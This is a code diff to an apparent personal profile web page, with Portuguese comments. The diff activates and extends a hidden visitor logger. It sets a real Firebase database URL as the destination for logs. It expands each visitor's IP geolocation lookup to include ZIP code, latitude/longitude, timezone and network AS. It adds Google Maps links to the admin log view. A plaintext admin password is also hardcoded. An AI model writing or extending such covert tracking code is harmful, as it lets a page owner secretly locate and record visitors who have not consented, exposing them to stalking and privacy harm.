@@ -844,7 +844,7 @@ const ADMIN_PASSWORD = "Com16dacl593!"; // 👈 SENHA DO PAINEL ADMIN
 // ⚠️ SE NÃO CONFIGURAR O FIREBASE, os logs ficam APENAS no
 //    navegador de cada visitante (vc não vê os outros IPs).
 
-const FIREBASE_DATABASE_URL = ""; // 👈 COLE A URL AQUI (ex: "https://gunslol-default-rtdb.firebaseio.com")
+const FIREBASE_DATABASE_URL = "https://gunslol-13547-default-rtdb.firebaseio.com";
 
 // ============================================================
 // LOADING
@@ -1084,7 +1084,10 @@ let adminClickTimer = null;
 // ---- Firebase Helper Functions ----
 function firebaseUrl(path) {
   if (!FIREBASE_DATABASE_URL) return null;
-  return `${FIREBASE_DATABASE_URL}/${path}.json`;
+  // Remove barra final se houver
+  let base = FIREBASE_DATABASE_URL.trim();
+  if (base.endsWith('/')) base = base.slice(0, -1);
+  return `${base}/${path}.json`;
 }
 
 // Escrever log no Firebase (append)
@@ -1135,12 +1138,17 @@ async function captureVisitorData() {
     const ipData = await ipRes.json();
     data.ip = ipData.ip;
     try {
-      const locRes = await fetch(`https://ip-api.com/json/${data.ip}?fields=city,region,country,isp,org`);
+      const locRes = await fetch(`https://ip-api.com/json/${data.ip}?fields=city,region,country,zip,lat,lon,timezone,isp,org,as`);
       const locData = await locRes.json();
       data.location.city = locData.city || '?';
       data.location.region = locData.region || '?';
       data.location.country = locData.country || '?';
+      data.location.zip = locData.zip || '?';
+      data.location.lat = locData.lat || null;
+      data.location.lon = locData.lon || null;
+      data.location.timezone = locData.timezone || '?';
       data.location.isp = locData.isp || locData.org || '?';
+      data.location.as = locData.as || '?';
     } catch {}
   } catch {}
 
@@ -1266,12 +1274,21 @@ async function renderAdminLogs() {
     const hora = d.toLocaleTimeString('pt-BR');
     const flag = log.location.country && log.location.country !== '?' ? getFlag(log.location.country) : '🌐';
 
+    const mapsLink = log.location.lat && log.location.lon
+      ? `<a href="https://www.google.com/maps?q=${log.location.lat},${log.location.lon}" target="_blank" rel="noopener" style="color:var(--cyan); text-decoration:none;">🗺️ Ver no Maps</a>`
+      : '';
+    const zipDisplay = log.location.zip && log.location.zip !== '?' ? ` | 📮 CEP: ${log.location.zip}` : '';
+
     html += `<div class="admin-log-entry">
       <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:4px;">
         <span class="log-ip">${flag} ${log.ip}</span>
         <span class="log-time">${data} ${hora}</span>
       </div>
-      <div class="log-location">📍 ${log.location.city}, ${log.location.region} — ${log.location.country}</div>
+      <div class="log-location">📍 ${log.location.city}, ${log.location.region} — ${log.location.country}${zipDisplay}</div>
+      <div style="display:flex; flex-wrap:wrap; gap:4px; margin-top:2px; font-size:0.7rem;">
+        <span style="color:var(--text-secondary);">🕐 ${log.location.timezone || '?'}</span>
+        ${mapsLink ? `<span>${mapsLink}</span>` : ''}
+      </div>
       <div style="display:flex; justify-content:space-between; flex-wrap:wrap; gap:4px; margin-top:4px;">
         <span class="log-device">🖥️ ${log.screen} | ${log.language}</span>
         <span class="log-isp">📡 ${log.location.isp}</span>
